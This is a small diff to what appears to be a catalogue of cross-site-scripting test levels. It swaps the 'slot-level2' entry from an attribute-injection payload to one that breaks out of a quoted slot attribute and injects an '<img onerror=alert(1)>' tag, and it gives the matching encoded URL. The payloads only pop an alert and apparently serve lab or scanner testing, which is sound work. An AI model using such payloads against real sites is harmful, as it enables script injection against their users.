@@ -11,10 +11,10 @@ Web-component `<slot>` reflections — light DOM text/attribute interpolation th
 
 ### slot-level2
 
-`/slot/level2/?query=a'%20onload=alert(1)%20x='`
+`/slot/level2/?query=a'%3E%3Cimg%20src=x%20onerror=alert(1)%3E`
 
-- payload: `a' onload=alert(1) x='`
-- context: reflected inside `<span slot='...'>`; single-quote breakout
+- payload: `a'><img src=x onerror=alert(1)>`
+- context: reflected inside `<span slot='...'>`; break out and inject a tag
 
 ### slot-level3
 
